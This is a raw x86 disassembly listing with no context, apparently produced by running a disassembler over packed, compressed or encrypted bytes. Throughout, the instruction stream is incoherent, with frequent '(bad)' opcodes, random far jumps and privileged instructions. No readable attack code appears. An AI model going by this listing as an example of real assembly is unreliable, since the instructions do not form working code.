  420138:	jecxz  0x4200bf
  42013a:	jns    0x4200d2
  42013c:	fisub  DWORD PTR [edi]
  42013e:	jmp    0xfcb:0x4c7194a9
  420145:	mov    ebx,0x74c19478
  42014a:	popf   
  42014b:	jle    0x42013d
  42014d:	sub    al,0xdf
  42014f:	cli    
  420150:	cmp    ecx,DWORD PTR [edi-0x39]
  420153:	cs jg  0x4200d9
  420156:	xchg   ecx,eax
  420157:	fs mov edi,0x78cae532
  42015d:	dec    esi
  42015e:	dec    edx
  42015f:	mov    esi,0xf50ed9ee
  420164:	(bad)  
  420165:	cdq    
  420166:	je     0x4201bf
  420168:	into   
  420169:	cmc    
  42016a:	lea    esi,[ebp+ecx*8+0x5a]
  42016e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42016f:	lock fs (bad) 
  420172:	popf   
  420173:	sbb    BYTE PTR [ebx+0x8],al
  420176:	fnsave [edi+0x74c927e8]
  42017c:	outs   dx,BYTE PTR ds:[esi]
  42017d:	sti    
  42017e:	mov    eax,0x24d36e89
  420183:	aad    0x91
  420185:	fs push ds
  420187:	loop   0x420119
  420189:	outs   dx,DWORD PTR ds:[esi]
  42018a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42018b:	xchg   esp,eax
  42018c:	and    BYTE PTR [ecx+0x5bd6535c],0x2e
  420193:	pop    esi
  420194:	mov    ch,0x73
  420196:	stos   DWORD PTR es:[edi],eax
  420197:	dec    eax
  420198:	fcmovne st,st(3)
  42019a:	push   esi
  42019b:	inc    ecx
  42019c:	fdiv   QWORD PTR [edi-0x48f3a4ac]
  4201a2:	aaa    
  4201a3:	sbb    esi,esi
  4201a5:	xchg   BYTE PTR [edx+0x57bc2d87],dh
  4201ab:	popf   
  4201ac:	sub    BYTE PTR [esi+edx*4-0x51892fb5],dh
  4201b3:	inc    ebx
  4201b4:	or     eax,0xa83fe29f
  4201b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4201ba:	cmc    
  4201bb:	cs cmp eax,0x662bc2d6
  4201c1:	pop    ecx
  4201c2:	inc    esi
  4201c3:	push   cs
  4201c4:	jle    0x4201a7
  4201c6:	push   0x1dd7ed5b
  4201cb:	(bad)  
  4201cc:	adc    DWORD PTR [esi-0x5c],ebp
  4201cf:	test   eax,0xce44f131
  4201d4:	inc    esp
  4201d5:	add    BYTE PTR [edx],dh
  4201d7:	mov    ebx,DWORD PTR [eax+edx*1-0x19]
  4201db:	hlt    
  4201dc:	push   0x90f66b25
  4201e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4201e2:	mov    fs,WORD PTR [edx-0x3e]
  4201e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4201e6:	retf   0x6707
  4201e9:	cmp    eax,0xe3d587b4
  4201ee:	(bad)  
  4201f0:	push   cs
  4201f1:	ds mov bl,0xf7
  4201f4:	xor    edi,DWORD PTR [ebp+0x55549ffb]
  4201fa:	bound  edx,QWORD PTR [ebp+0x354c848b]
  420200:	add    al,0x5d
  420202:	daa    
  420203:	aad    0x28
  420205:	inc    edx
  420206:	sahf   
  420207:	sahf   
  420208:	and    esp,DWORD PTR [edx+esi*1+0x34e34f2c]
  42020f:	mov    bh,0x5f
  420211:	dec    edi
  420212:	popf   
  420213:	fsub   QWORD PTR [esi]
  420215:	iret   
  420216:	jecxz  0x420290
  420218:	or     BYTE PTR [edx+0x5e229658],al
  42021e:	(bad)  
  42021f:	mov    ebx,0x7cbb4986
  420224:	cwde   
  420225:	(bad)  
  420226:	pop    esp
  420227:	xor    al,0xb4
  420229:	out    dx,eax
  42022a:	dec    ecx
  42022b:	pop    edx
  42022c:	inc    edi
  42022d:	jbe    0x4201c0
  42022f:	sbb    BYTE PTR [edx+0x6c],cl
  420232:	lahf   
  420233:	cwde   
  420234:	test   BYTE PTR [ebp+0x55bca8e1],al
  42023a:	lods   eax,DWORD PTR ds:[esi]
  42023b:	mov    ds,ebp
  42023d:	and    DWORD PTR [ecx+0x20078c6f],edx
  420243:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420244:	jne    0x4202a6
  420246:	mov    edi,0xf1571296
  42024b:	add    esi,DWORD PTR [esi-0x73]
  42024e:	das    
  42024f:	mov    bh,0x93
  420251:	shl    BYTE PTR [ecx],0x1a
  420254:	sub    dh,BYTE PTR [esi]
  420256:	jbe    0x420201
  420258:	and    al,0x55
  42025a:	sub    ebp,ebp
  42025c:	in     al,0xd4
  42025e:	pop    ebp
  42025f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420260:	clc    
  420261:	bound  esp,QWORD PTR ds:[ecx]
  420264:	mov    dh,BYTE PTR [edi-0x3d]
  420267:	xchg   BYTE PTR [edx-0x6b81c823],bl
  42026d:	inc    ebx
  42026e:	cli    
  42026f:	repnz outs dx,BYTE PTR ds:[esi]
  420271:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420272:	(bad)  
  420273:	jbe    0x4202ac
  420275:	inc    edx
  420276:	fidivr WORD PTR [ecx+eax*2-0x57]
  42027a:	inc    edx
  42027b:	daa    
  42027c:	lahf   
  42027d:	scas   eax,DWORD PTR es:[edi]
  42027e:	daa    
  42027f:	dec    ebp
  420280:	cwde   
  420281:	sbb    ecx,DWORD PTR [ebx]
  420283:	jns    0x420258
  420285:	cmp    ch,BYTE PTR [edi+0x787fc2ce]
  42028b:	and    ah,0x62
  42028e:	cld    
  42028f:	add    edi,eax
  420291:	sbb    al,BYTE PTR ds:0x86579441
  420297:	or     al,0xae
  420299:	repz jmp FWORD PTR [ebp-0x1c]
  42029d:	popf   
  42029e:	xchg   ebx,eax
  42029f:	sub    edi,DWORD PTR [ebp-0x6b8966c5]
  4202a5:	daa    
  4202a6:	cli    
  4202a7:	or     eax,0xa6bd6a01
  4202ac:	push   ebx
  4202ad:	inc    ebp
  4202ae:	es xor eax,0x24e338d1
  4202b4:	jp     0x420270
  4202b6:	es hlt 
  4202b8:	cdq    
  4202b9:	and    ah,BYTE PTR [ebx+0x27]
  4202bc:	out    dx,al
  4202bd:	out    0x5a,al
  4202bf:	and    BYTE PTR [esi],ch
  4202c1:	mov    ch,0x99
  4202c3:	scas   al,BYTE PTR es:[edi]
  4202c4:	into   
  4202c5:	or     BYTE PTR [eax+esi*2],ah
  4202c8:	test   eax,ebp
  4202ca:	(bad)  
  4202cb:	mov    ebx,0x9feed7f1
  4202d0:	inc    eax
  4202d1:	jnp    0x420264
  4202d3:	pusha  
  4202d4:	jg     0x4202e0
  4202d6:	clc    
  4202d7:	pop    esi
  4202d8:	sub    BYTE PTR [edi+0x6d],0xe3
  4202dc:	fwait
  4202dd:	xor    dl,BYTE PTR [ecx]
  4202df:	cmp    ebx,esi
  4202e1:	sbb    ah,BYTE PTR [edi-0x52]
  4202e4:	xchg   ecx,eax
  4202e5:	add    edi,DWORD PTR [ebx-0x591c936b]
  4202eb:	inc    ecx
  4202ec:	and    DWORD PTR [edi+edx*8],ecx
  4202ef:	ins    BYTE PTR es:[edi],dx
  4202f0:	jno    0x42029b
  4202f2:	jbe    0x420286
  4202f4:	aad    0x60
  4202f6:	aaa    
  4202f7:	clc    
  4202f8:	dec    eax
  4202f9:	lahf   
  4202fa:	push   ds
  4202fb:	add    eax,DWORD PTR [eax-0xa]
  4202fe:	sub    DWORD PTR [esi-0x2f],edi
  420301:	(bad)  
  420302:	jl     0x420288
  420304:	adc    bl,bh
  420306:	add    DWORD PTR ds:0x51f11fe1,edx
  42030c:	cmp    edx,DWORD PTR [edi+0x3e03f1cc]
  420312:	inc    esi
  420313:	xor    DWORD PTR [edx-0x758ae097],0x2d293aee
  42031d:	sar    DWORD PTR [ebp-0x531c65a],0x99
  420324:	xor    ebx,edx
  420326:	fidivr WORD PTR [ebx]
  420328:	fild   DWORD PTR [ebp-0x2c]
  42032b:	ss stos DWORD PTR es:[edi],eax
  42032d:	scas   al,BYTE PTR es:[edi]
  42032e:	jle    0x420395
  420330:	mov    ecx,0xb29bd028
  420335:	in     al,dx
  420336:	test   al,0xf
  420338:	sbb    BYTE PTR [ebp-0x78bc971b],bh
  42033e:	iret   
  42033f:	jae    0x420361
  420341:	sysenter 
  420343:	sar    DWORD PTR [esi],1
  420345:	dec    bl
  420347:	push   edi
  420348:	scas   eax,DWORD PTR es:[edi]
  420349:	and    BYTE PTR [ebp+0x34fee6ea],dl
  42034f:	jb     0x42033e
  420351:	call   ebp
  420353:	and    al,0x1e
  420355:	mov    dl,0x8f
  420357:	dec    esi
  420358:	jge    0x4203b3
  42035a:	cmp    DWORD PTR [ecx-0x43],esi
  42035d:	dec    ebp
  42035e:	std    
  42035f:	nop
  420360:	aas    
  420361:	jbe    0x420304
  420363:	mov    eax,ds:0xbe8b5384
  420368:	mov    ah,0xe6
  42036a:	push   ebx
  42036b:	ins    BYTE PTR es:[edi],dx
  42036c:	jb     0x42031c
  42036e:	sbb    ebx,DWORD PTR [ecx+eax*2-0x25]
  420372:	ficom  WORD PTR ds:0xb15806f2
  420378:	adc    DWORD PTR [ebx-0x7d],edx
  42037b:	pop    ss
  42037c:	xor    ecx,edi
  42037e:	sbb    edx,0xb06cda85
  420384:	lahf   
  420385:	popa   
  420386:	(bad)  
  420387:	fimul  DWORD PTR [eax+eiz*8-0x65be073f]
  42038e:	mov    ebp,0x7f5723ca
  420393:	out    0x3b,al
  420395:	in     al,0x91
  420397:	mov    bl,0x36
  420399:	ins    DWORD PTR es:[edi],dx
  42039a:	bound  esp,QWORD PTR [ebx]
  42039c:	mov    ecx,0x16ee6bc6
  4203a1:	pop    es
  4203a2:	mov    cs,WORD PTR [edx-0xcb50fcb]
  4203a8:	push   0x1efc35ab
  4203ad:	push   ecx
  4203ae:	repz mov dl,0x62
  4203b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4203b2:	test   bl,dl
  4203b4:	pop    ds
  4203b5:	div    DWORD PTR [edi-0x45]
  4203b8:	inc    edx
  4203b9:	jo     0x4203ab
  4203bb:	push   0xffffffa3
  4203bd:	test   DWORD PTR [edi-0x6e62e5d7],esi
  4203c3:	mov    eax,0x17382d83
  4203c8:	scas   eax,DWORD PTR es:[edi]
  4203c9:	loope  0x420399
  4203cb:	test   DWORD PTR [edi+0x2bb53d52],0xede5dbbb
  4203d5:	or     ch,dl
  4203d7:	mov    ebx,0x5a46b6f2
  4203dc:	int3   
  4203dd:	mov    ecx,0x5f15939a
  4203e2:	cmp    eax,0x1190e248
  4203e7:	sbb    ch,BYTE PTR [eax]
  4203e9:	or     DWORD PTR [esp+ebx*4+0x4b],edx
  4203ed:	xchg   BYTE PTR [edx-0x4722fb6f],dl
  4203f3:	sbb    eax,0x7bbf8c1
  4203f8:	outs   dx,BYTE PTR ds:[esi]
  4203f9:	aam    0x7b
  4203fb:	pop    es
  4203fc:	popa   
  4203fd:	cwde   
  4203fe:	int3   
  4203ff:	popa   
  420400:	pusha  
  420401:	xchg   ebx,eax
  420402:	aam    0xb4
  420404:	adc    eax,0x8343cca4
  420409:	inc    edx
  42040a:	ja     0x42045a
  42040c:	mov    ah,0xd0
  42040e:	es pop es
  420410:	loopne 0x42039a
  420412:	inc    ebx
  420413:	(bad)  
  420414:	dec    esp
  420415:	sub    BYTE PTR [eax],ch
  420417:	(bad)  
  420418:	xchg   esi,eax
  420419:	adc    al,0x20
  42041b:	fsubr  DWORD PTR [ebx+0x2c]
  42041e:	mov    DWORD PTR [esi],esi
  420420:	add    eax,esi
  420422:	out    dx,eax
  420423:	popf   
  420424:	mov    edx,0x8bdc9709
  420429:	add    dl,BYTE PTR [ecx-0x57]
  42042c:	adc    BYTE PTR [edx],ah
  42042e:	jle    0x4204a8
  420430:	adc    al,0xb9
  420432:	retf   0xc8bd
  420435:	jnp    0x420445
  420437:	jl     0x4203ef
  420439:	ret    
  42043a:	inc    ebp
  42043b:	mov    ds:0x10c56ea6,eax
  420440:	fucomp st(3)
  420442:	loopne 0x420482
  420444:	adc    BYTE PTR [edx+0x5f],bl
  420447:	ds jnp 0x4203d4
  42044a:	call   0x725f:0x4c271a28
  420451:	aas    
  420452:	sbb    DWORD PTR [eax-0x7d],0x128adb8
  420459:	lods   eax,DWORD PTR ds:[esi]
  42045a:	jmp    0xe3f809d7
  42045f:	jmp    0x327c80e0
  420464:	xchg   esp,eax
  420465:	mov    esp,0x21d1153d
  42046a:	xor    ebx,DWORD PTR [eax]
  42046c:	es pushf 
  42046e:	div    BYTE PTR [edi-0x29f9ef51]
  420474:	mov    al,ds:0x959eaf38
  420479:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42047a:	and    DWORD PTR [edx+ebp*8-0x41b18e8b],esp
  420481:	inc    esp
  420482:	sahf   
  420483:	out    dx,al
  420484:	pop    ebp
  420485:	cmc    
  420486:	repnz retf 
  420488:	fadd   QWORD PTR [ecx+eax*8-0xda4f4e2]
  42048f:	sahf   
  420490:	mov    eax,0xb1741756
  420495:	mov    ebx,0xed9b517
  42049a:	jae    0x4204ef
  42049c:	cmp    al,cl
  42049e:	inc    ebp
  42049f:	dec    ebx
  4204a0:	ss pop ebp
  4204a2:	cmc    
  4204a3:	(bad)  
  4204a4:	test   eax,0x77f775f6
  4204a9:	aaa    
  4204aa:	cmp    ebx,DWORD PTR [ebx-0x29c7e41d]
  4204b0:	cmp    BYTE PTR [edi+eiz*8-0x5b0da16f],0x3b
  4204b8:	mov    al,0x46
  4204ba:	fistp  DWORD PTR [ebx+edx*4]
  4204bd:	and    ecx,ecx
  4204bf:	inc    ebx
  4204c0:	pop    edx
  4204c1:	jne    0x4204eb
  4204c3:	shr    BYTE PTR [ebx],1
  4204c5:	mov    WORD PTR [edx],fs
  4204c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4204c8:	in     al,dx
  4204c9:	xor    cl,BYTE PTR [ecx-0x71995bf2]
  4204cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4204d0:	mov    al,ds:0x7b115c40
  4204d5:	enter  0x766f,0x8c
  4204d9:	aaa    
  4204da:	aad    0x35
  4204dc:	in     eax,dx
  4204dd:	mov    al,ds:0xf6441b29
  4204e2:	xchg   ebx,eax
  4204e3:	dec    edi
  4204e4:	nop
  4204e5:	sti    
  4204e6:	jle    0x4204c7
  4204e8:	jae    0x4204db
  4204ea:	pop    eax
  4204eb:	push   esp
  4204ec:	dec    esi
  4204ed:	or     eax,ebx
  4204ef:	mov    ebp,0x7026d16
  4204f4:	add    esi,DWORD PTR [ebp+0x76]
  4204f7:	xlat   BYTE PTR ds:[ebx]
  4204f8:	xchg   esi,eax
  4204f9:	cli    
  4204fa:	xchg   esp,eax
  4204fb:	(bad)  
  4204fc:	in     al,dx
  4204fd:	dec    esi
  4204fe:	std    
  4204ff:	mov    ds:0xba967dd7,eax
  420504:	mov    ds:0xd80bf0ee,al
  420509:	sar    edx,0xc6
  42050c:	sbb    BYTE PTR [edx+0x50960d5c],bh
  420512:	aam    0x5f
  420514:	push   DWORD PTR [esi+0x75]
  420517:	int3   
  420518:	pusha  
  420519:	nop
  42051a:	outs   dx,BYTE PTR ds:[esi]
  42051b:	push   ebx
  42051c:	fild   DWORD PTR [ebx+ebx*4]
  42051f:	dec    eax
  420520:	adc    esp,DWORD PTR [edx+0x2d]
  420523:	es pop eax
  420525:	mov    WORD PTR [edi+0x79],fs
  420528:	int3   
  420529:	jae    0x42058a
  42052b:	sahf   
  42052c:	add    BYTE PTR [edi],ah
  42052e:	ds jmp 0x36a38dac
  420534:	push   ecx
  420535:	sub    BYTE PTR [edx-0x2f],0x20
  420539:	jle    0x4204e5
  42053b:	pcmpgtb mm3,QWORD PTR [edi]
  42053e:	or     ch,bh
  420540:	sbb    eax,0xa21b3d07
  420545:	shl    al,0x5c
  420548:	add    eax,0xda3d7dab
  42054d:	ds pushf 
  42054f:	xlat   BYTE PTR cs:[ebx]
  420551:	adc    al,0x40
  420553:	sub    ah,dh
  420555:	xchg   esi,eax
  420556:	(bad)  
  420558:	jmp    FWORD PTR [ebp-0x231e4013]
  42055e:	push   ebp
  42055f:	xchg   esi,eax
  420560:	adc    DWORD PTR ds:0xe7605c37,edi
  420566:	in     al,dx
  420567:	call   0x87d8:0xe8d6965d
  42056e:	mov    esp,0xc6489094
  420573:	and    BYTE PTR [ebp+0x4],dh
  420576:	pusha  
  420577:	sbb    eax,0x29f4d42
  42057c:	ds rcl al,cl
  42057f:	or     eax,0xf4b64766
  420584:	mov    edx,0x7fe9e735
  420589:	retf   0xa89f
  42058c:	or     ecx,eax
  42058e:	loop   0x4205d2
  420590:	sub    dh,BYTE PTR [ecx-0xd]
  420593:	cmp    BYTE PTR [ebp-0x2a],0xbe
  420597:	(bad)  
  420598:	push   cs
  420599:	(bad)
  42059d:	dec    ecx
  42059e:	dec    ecx
  42059f:	(bad)  
  4205a0:	mov    ah,0x6b
  4205a2:	iret   
  4205a3:	dec    edi
  4205a4:	(bad)  
  4205a5:	mov    esp,0x6215dfd7
  4205aa:	lahf   
  4205ab:	cmp    edx,DWORD PTR [ecx-0x29]
	...
  42077a:	(bad)  
  42077b:	stc    
  42077c:	out    0xe3,eax
  42077e:	(bad)  
  42077f:	inc    edi
  420781:	std    
  420782:	fidivr WORD PTR [ebx]
  420784:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420785:	dec    esp
  420786:	mov    dl,0xd
  420788:	popf   
  420789:	adc    al,0x9f
  42078b:	mov    esi,0x7220001
  420790:	add    BYTE PTR [eax],al
  420792:	repz scas al,BYTE PTR es:[edi]
  420794:	mov    al,ds:0x8ce05439
  420799:	pop    eax
  42079a:	push   0x73
  42079c:	push   cs
  42079d:	sub    ebp,DWORD PTR [ebx]
  42079f:	ds mov si,0x1ae0
  4207a4:	xchg   edi,eax
  4207a5:	fs sub eax,0x57de322d
  4207ab:	shld   DWORD PTR [esi],esp,cl
  4207ae:	or     al,0xbc
  4207b0:	repnz inc DWORD PTR [edx+edi*8+0x0]
  4207b5:	push   ds
  4207b6:	test   eax,0xfc1ac08a
  4207bb:	xchg   edi,eax
  4207bc:	and    al,0xcc
  4207be:	es dec edi
  4207c0:	and    DWORD PTR [edi-0x11670eb3],ebp
  4207c6:	mov    cl,0x6c
  4207c8:	xor    bh,ah
  4207ca:	mov    edi,ss
  4207cc:	add    al,0x9a
  4207ce:	and    esp,DWORD PTR [eax-0x66]
  4207d1:	or     eax,0x5b913269
  4207d6:	sub    bl,ah
  4207d8:	sbb    ebp,ecx
  4207da:	xlat   BYTE PTR ds:[ebx]
  4207db:	dec    edi
  4207dc:	imul   ebp,DWORD PTR [ecx+0x6f4a0a1a],0x6
  4207e3:	aaa    
  4207e4:	mov    edi,0x2e318bd4
  4207e9:	jo     0x4207f9
  4207eb:	imul   esi,DWORD PTR [edi],0x7e
  4207ee:	or     eax,ebp
  4207f0:	mov    ebx,0x8ea78cd4
  4207f5:	jge    0x420783
  4207f7:	dec    ebx
  4207f8:	adc    DWORD PTR [esi],ebx
  4207fa:	mov    esp,0x32998726
  4207ff:	lods   al,BYTE PTR ds:[esi]
  420800:	mov    esp,0xfd86ae95
  420805:	popf   
  420806:	push   edi
  420807:	sub    DWORD PTR [edx],edx
  420809:	pop    edx
  42080a:	dec    edi
  42080b:	inc    edi
  42080c:	loopne 0x42087e
  42080e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42080f:	mov    ebx,0x894e6164
  420814:	sbb    DWORD PTR [esi+0x5e],edx
  420817:	mov    edi,0x65e10acb
  42081c:	add    al,0x52
  42081e:	stos   BYTE PTR es:[edi],al
  42081f:	adc    eax,0x324fc994
  420824:	and    al,0x33
  420826:	inc    esp
  420827:	ltr    WORD PTR [si]
  42082b:	or     al,BYTE PTR [esi-0x4062b188]
  420831:	xchg   esp,eax
  420832:	push   ecx
  420833:	cmp    esp,DWORD PTR [eax+0x3d]
  420836:	push   esp
  420837:	inc    edx
  420838:	in     eax,dx
  420839:	fcom   DWORD PTR [ebx]
  42083b:	pop    ss
  42083c:	jmp    0x869e:0xa131ef9a
  420843:	sub    eax,DWORD PTR [esi-0x46e50cf1]
  420849:	sbb    dl,ah
  42084b:	add    bh,ch
  42084d:	and    al,0xff
  42084f:	dec    edi
  420850:	cmp    eax,0x56f6bfa0
  420855:	mov    ecx,0x50e77d1c
  42085a:	add    DWORD PTR [esi+eax*2+0x52],0xffffff97
  42085f:	inc    ebp
  420860:	sbb    BYTE PTR [ebp+0x5b206275],0x53
  420867:	adc    al,0xea
  420869:	add    al,0x3c
  42086b:	mov    WORD PTR [edx],cs
  42086d:	jb     0x4208ae
  42086f:	push   0xc98a4ba1
  420874:	dec    ebx
  420875:	fsubr  QWORD PTR [eax+0x3a]
  420878:	ret    
  420879:	mov    ebp,0x5fcdd0f4
  42087e:	push   ds
  42087f:	(bad)  
  420880:	scas   eax,DWORD PTR es:[edi]
  420881:	sti    
  420882:	(bad)  
  420883:	xchg   edi,eax
  420884:	ins    BYTE PTR es:[edi],dx
  420885:	clc    
  420886:	sti    
  420887:	test   DWORD PTR [edx-0x645f7f7b],esp
  42088d:	in     al,0xf8
  42088f:	in     eax,dx
  420890:	pop    esp
  420891:	dec    eax
  420892:	dec    edx
  420893:	je     0x4208db
  420895:	mov    dh,0x2a
  420897:	test   eax,0x998e2c82
  42089c:	mov    ebp,0x1bc82af1
  4208a1:	mov    cl,0x15
  4208a3:	retf   
  4208a4:	js     0x420875
  4208a6:	push   esi
  4208a7:	sub    DWORD PTR [ebx-0x48],0x61
  4208ab:	push   cs
  4208ac:	mov    WORD PTR [ecx],gs
  4208ae:	arpl   WORD PTR [edi],bx
  4208b0:	jns    0x42085e
  4208b2:	sbb    al,0xf4
  4208b4:	pop    ebp
  4208b5:	neg    BYTE PTR [esi-0x333df4ec]
  4208bb:	cmp    eax,0x59985b5f
  4208c0:	xor    edx,ebx
  4208c2:	or     bh,bl
  4208c4:	dec    esi
  4208c5:	jb     0x42086a
  4208c7:	std    
  4208c8:	bound  eax,QWORD PTR [edx-0x2946a5ce]
  4208ce:	mov    eax,0x36680755
  4208d3:	aam    0x71
  4208d5:	stos   DWORD PTR es:[edi],eax
  4208d6:	add    cl,BYTE PTR [ecx-0x49]
  4208d9:	xor    bl,ah
  4208db:	push   ebx
  4208dc:	shl    BYTE PTR [ebp-0x3f0315fb],0xc1
  4208e3:	mov    esi,0x6d2ff74c
  4208e8:	dec    eax
  4208e9:	mov    ecx,0x89e0e852
  4208ee:	mov    ds:0xc81fc788,eax
  4208f3:	push   0x58
  4208f5:	outs   dx,DWORD PTR ds:[si]
  4208f7:	pop    edx
  4208f8:	in     eax,0x1d
  4208fa:	out    0x15,eax
  4208fc:	call   0x7fd2:0xbfbbd6f4
  420903:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420904:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420905:	xor    ebp,DWORD PTR [ecx+edi*1-0x32]
  420909:	mov    WORD PTR ds:0xa78edc12,ds
  42090f:	nop
  420910:	add    al,0xd6
  420912:	xor    ch,BYTE PTR [edi]
  420914:	mov    ch,0x63
  420916:	jle    0x4208d7
  420918:	jmp    0xd33:0xc3f57494
  42091f:	adc    al,0xd1
  420921:	mov    al,ds:0x9fc77a45
  420926:	push   ss
  420927:	popa   
  420928:	add    al,BYTE PTR [eax-0x57]
  42092b:	adc    edi,DWORD PTR [eax]
  42092d:	gs sahf 
  42092f:	pop    esp
  420930:	mov    ds:0x7bee324d,al
  420935:	stos   DWORD PTR es:[edi],eax
  420936:	push   ebp
  420937:	xchg   edx,eax
  420938:	adc    DWORD PTR [ecx-0x672a32ce],esi
  42093e:	pusha  
  42093f:	test   DWORD PTR [edx-0x5d],edx
  420942:	pop    esp
  420943:	fdivr  st,st(1)
  420945:	push   esp
  420946:	fs jae 0x420945
  420949:	or     esp,DWORD PTR ds:0xd4e84d6f
  42094f:	stos   DWORD PTR es:[edi],eax
  420950:	adc    DWORD PTR ds:0x2b9d7e50,edi
  420956:	aam    0x4b
  420958:	cmp    edx,0xfffffff3
  42095b:	lds    esi,FWORD PTR [ebx-0x65]
  42095e:	arpl   WORD PTR [edx-0x6c1ad932],ax
  420964:	mov    dh,BYTE PTR ds:0x93066f25
  42096a:	or     esi,eax
  42096c:	jnp    0x42095d
  42096e:	(bad)  
  42096f:	iret   
  420970:	or     DWORD PTR [edx],esi
  420972:	fwait
  420973:	xchg   edx,eax
  420974:	je     0x420926
  420976:	out    0x38,al
  420978:	(bad)  
  420979:	fs popf 
  42097b:	xor    BYTE PTR [ebp+0x35],al
  42097e:	popf   
  42097f:	jae    0x4209e1
  420981:	push   esi
  420982:	outs   dx,DWORD PTR ds:[esi]
  420983:	xchg   BYTE PTR [eax+0x69531b93],dl
  420989:	ficomp WORD PTR [ecx+eax*2+0x38e8c9c1]
  420990:	ret    
  420991:	sub    esi,DWORD PTR [edi]
  420993:	popf   
  420994:	(bad)  
  420995:	cmp    bh,BYTE PTR [eax]
  420997:	and    BYTE PTR [edi-0x6f68fd8d],0x47
  42099e:	lds    ecx,FWORD PTR [edx-0x1f8765eb]
  4209a4:	add    BYTE PTR [ecx-0x7bc84a56],ch
  4209aa:	or     dl,BYTE PTR [ebx]
  4209ac:	jne    0x420961
  4209ae:	dec    eax
  4209af:	mov    esi,0x11b5719a
  4209b4:	xchg   ebx,eax
  4209b5:	push   es
  4209b6:	add    esp,ecx
  4209b8:	push   0xffffffb0
  4209ba:	lods   eax,DWORD PTR ds:[esi]
  4209bb:	inc    eax
  4209bc:	inc    eax
  4209bd:	push   cs
  4209be:	ror    BYTE PTR ds:0x2129f821,1
  4209c4:	fisttp DWORD PTR [edx+0x5d]
  4209c7:	das    
  4209c8:	mov    DWORD PTR [eax+ebx*2-0x74],edi
  4209cc:	add    DWORD PTR [edx+0x58e98c7],edi
  4209d2:	dec    eax
  4209d3:	dec    ebp
  4209d4:	loopne 0x420a30
  4209d6:	retf   0x1d22
  4209d9:	outs   dx,DWORD PTR ds:[esi]
  4209da:	sbb    al,0x75
  4209dc:	ja     0x4209ed
  4209de:	or     DWORD PTR [ebp+ebp*1+0x43dd2f5f],ebx
  4209e5:	test   al,0x88
  4209e7:	and    ebp,eax
  4209e9:	in     al,dx
  4209ea:	dec    ebx
  4209eb:	pop    edi
  4209ec:	mov    ebx,0xc5350b57
  4209f1:	sbb    DWORD PTR [ebx-0x4],eax
  4209f4:	sub    al,0x5b
  4209f6:	xchg   esi,eax
  4209f7:	call   0xc812:0x18015589
  4209fe:	retf   
  4209ff:	rol    BYTE PTR [ecx+0x1b],1
  420a02:	add    cl,BYTE PTR [edi+0x20]
  420a05:	dec    ebp
  420a06:	dec    ebx
  420a07:	add    al,0x3c
  420a09:	repz xor ah,al
  420a0c:	(bad)  [ecx-0x4124e3f]
  420a12:	cdq    
  420a13:	mov    ds:0xa00b8df6,al
  420a18:	imul   ebx,DWORD PTR [ebx],0x772c2ab7
  420a1e:	jbe    0x420a2b
  420a20:	dec    ebx
  420a21:	loop   0x4209fc
  420a23:	mov    ecx,0xec87c306
  420a28:	arpl   bp,cx
  420a2a:	xchg   esp,eax
  420a2b:	cmp    al,0x12
  420a2d:	ja     0x420a73
  420a2f:	mov    cl,0xa7
  420a31:	pop    edi
  420a32:	neg    BYTE PTR [ebx]
  420a34:	xchg   DWORD PTR [edx+0x686d6885],ebp
  420a3a:	fnstenv [ebx]
  420a3c:	pop    eax
  420a3d:	cmp    BYTE PTR [edx-0x6],bl
  420a40:	(bad)  [esi]
  420a42:	xchg   BYTE PTR [eax-0x44b871e0],al
  420a48:	xlat   BYTE PTR ds:[ebx]
  420a49:	imul   dl
  420a4b:	cmp    esi,DWORD PTR [eax-0x3e15d8ee]
  420a51:	fld    TBYTE PTR [edi-0x10]
  420a54:	xor    eax,0x2b2877e2
  420a59:	jmp    0x214196a6
  420a5e:	pop    edi
  420a5f:	mov    ds:0xf7770239,al
  420a64:	aas    
  420a65:	cmp    al,0x92
  420a67:	call   0xabbd:0x365a3a6b
  420a6e:	lahf   
  420a6f:	call   0x299b658c
  420a74:	fstp   DWORD PTR [edi]
  420a76:	mov    cl,BYTE PTR [edx-0x55767fed]
  420a7c:	idiv   DWORD PTR [eax-0x3220cd7e]
  420a82:	or     BYTE PTR [edi],dh
  420a84:	add    al,0x60
  420a86:	inc    ecx
  420a87:	(bad)  
  420a88:	and    BYTE PTR [ecx+0x3f7f0333],bh
  420a8e:	dec    edx
  420a8f:	fisub  DWORD PTR ds:0x1e44865b
  420a95:	shl    DWORD PTR [edx+0x56],cl
  420a98:	mov    ds,WORD PTR [edx+0x67]
  420a9b:	or     DWORD PTR [ebp+0x79676535],esp
  420aa1:	cmp    DWORD PTR [edi-0xf],ebp
  420aa4:	mov    ds:0x271222a4,al
  420aa9:	ss jo  0x420ad0
  420aac:	outs   dx,DWORD PTR ds:[esi]
  420aad:	jne    0x420a3f
  420aaf:	sub    cl,ah
  420ab1:	mov    dl,cl
  420ab3:	les    edx,FWORD PTR [ebx+0x2354743f]
  420ab9:	(bad)
  420abc:	fninit 
  420abe:	jnp    0x420af7
  420ac0:	ins    BYTE PTR es:[edi],dx
  420ac1:	or     eax,0xc206fbce
  420ac6:	push   ds
  420ac7:	fcom   DWORD PTR [esi-0x5e2263fd]
  420acd:	xor    BYTE PTR [edi+0x3c304222],al
  420ad3:	sbb    edx,esp
  420ad5:	adc    BYTE PTR [edi+0x19],cl
  420ad8:	stos   BYTE PTR es:[edi],al
  420ad9:	xchg   edi,eax
  420ada:	inc    esi
  420adb:	aaa    
  420adc:	loopne 0x420af5
  420ade:	adc    al,0xaf
  420ae0:	fstp   QWORD PTR [edx]
